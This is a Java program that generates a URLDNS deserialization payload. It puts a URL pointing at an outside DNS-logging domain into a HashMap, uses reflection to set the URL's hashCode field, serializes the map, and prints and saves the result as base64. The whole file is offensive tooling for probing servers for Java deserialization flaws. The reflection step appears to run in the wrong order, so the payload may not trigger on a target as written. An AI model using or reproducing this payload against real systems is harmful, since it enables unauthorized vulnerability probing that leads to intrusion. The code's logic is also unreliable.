
import java.io.*;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class URLDNSPayload {
    public static void main(String[] args) throws Exception {
       
        String dnsDomain = "e80f45af10.ddns.1433.eu.org.";  
        
        HashMap<URL, String> map = new HashMap<>();
        URL url = new URL("http://" + dnsDomain);
        
        
        java.lang.reflect.Field f = java.net.URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);  
        
        map.put(url, "test");
        
       
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
        
        String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println("=== URLDNS Payload ===");
        System.out.println(base64);
        
        
        java.nio.file.Files.write(java.nio.file.Paths.get("urldns_payload.txt"), base64.getBytes());
    }
}